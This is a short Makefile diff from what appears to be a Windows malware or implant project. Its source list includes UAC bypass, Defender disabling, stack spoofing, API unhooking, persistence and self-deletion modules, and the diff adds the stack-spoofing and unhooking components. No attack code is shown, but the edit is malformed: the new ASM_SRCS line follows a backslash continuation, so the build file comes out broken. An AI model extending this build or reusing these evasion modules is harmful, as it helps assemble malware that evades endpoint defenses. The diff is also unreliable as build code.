@@ -68,12 +68,13 @@ SRCS = src/main.c \
        src/evasion/uac_bypass.c \
        src/evasion/peb_hide.c \
        src/evasion/defender_disable.c \
+       src/evasion/stack_spoof.c \
        src/evasion/mutex.c \
+       src/evasion/unhook.c \
        src/cleanup/persistence.c \
        src/cleanup/self_delete.c \
-       src/cleanup/temp_wipe.c
+ASM_SRCS = asm/mirage_stubs_v2.asm asm/stack_spoof_stubs.asm
 
-ASM_SRCS = asm/mirage_stubs_v2.asm
 
 OBJ_DIR = build
 OBJS = $(patsubst src/%.c, $(OBJ_DIR)/%.o, $(SRCS)) \
